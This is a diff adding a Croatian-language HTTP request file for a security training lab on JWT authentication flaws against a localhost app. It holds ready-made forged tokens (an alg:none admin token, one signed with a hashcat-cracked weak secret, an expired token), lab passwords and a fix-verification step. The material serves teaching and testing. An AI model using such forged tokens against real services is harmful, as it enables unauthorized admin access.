@@ -1,0 +1,46 @@
+### =====================================================================
+### Lab12 – A07 Authentication Failures: JWT propusti (CWE-347, CWE-798, CWE-613)
+### Upute: docs/labs/lab12-jwt.md
+### Tokene dekodirajte na https://jwt.io ili u CyberChefu ("JWT Decode").
+### =====================================================================
+@host = http://localhost:5080
+@jwt = ZALIJEPITE_JWT_OVDJE
+
+### 1) Prijava kao ana – vraća JWT (kopirajte "token" u @jwt)
+POST {{host}}/api/lab12/login
+Content-Type: application/json
+
+{"username": "ana", "password": "Ana123!"}
+
+### 2) Claimovi iz tokena
+GET {{host}}/api/lab12/me
+Authorization: Bearer {{jwt}}
+
+### 3) Ana nije ADMIN – očekivano 403
+GET {{host}}/api/lab12/admin
+Authorization: Bearer {{jwt}}
+
+### 4) NAPAD 1 – alg:none. Zaglavlje {"alg":"none","typ":"JWT"}, payload
+###    {"sub":"ana","role":"ADMIN","exp":4102444800}, prazan potpis (token završava točkom).
+###    Ranjivo: 200 "Dobrodošli u administraciju"
+GET {{host}}/api/lab12/admin
+Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbmEiLCJyb2xlIjoiQURNSU4iLCJleHAiOjQxMDI0NDQ4MDB9.
+
+### 5) NAPAD 2 – token krivotvoren slabom tajnom "secret123" (pronađenom hashcatom: -m 16500)
+###    Payload {"sub":"ana","role":"ADMIN","exp":4102444800}. Ranjivo: 200
+GET {{host}}/api/lab12/admin
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbmEiLCJyb2xlIjoiQURNSU4iLCJleHAiOjQxMDI0NDQ4MDB9.r6TCzzhKlaNmEknzt03LR72ePx4Mtl41tBrTn_gYZ8U
+
+### 6) NAPAD 3 – istekli token (exp = 1. 1. 2020.), potpisan slabom tajnom. Ranjivo: 200
+GET {{host}}/api/lab12/me
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbmEiLCJyb2xlIjoiVVNFUiIsImV4cCI6MTU3NzgzNjgwMH0.CSOBdXzmJpVD7nynSOqXMClcFuUyxag43BEXahxQAzc
+
+### 7) Prijava kao admin – legitimni pristup administraciji
+POST {{host}}/api/lab12/login
+Content-Type: application/json
+
+{"username": "admin", "password": "Admin123!"}
+
+### 8) PROVJERA POPRAVKA: zahtjevi 4), 5) i 6) vraćaju 401; 1)–3) i 7) rade kao prije
+GET {{host}}/api/lab12/admin
+Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbmEiLCJyb2xlIjoiQURNSU4iLCJleHAiOjQxMDI0NDQ4MDB9.
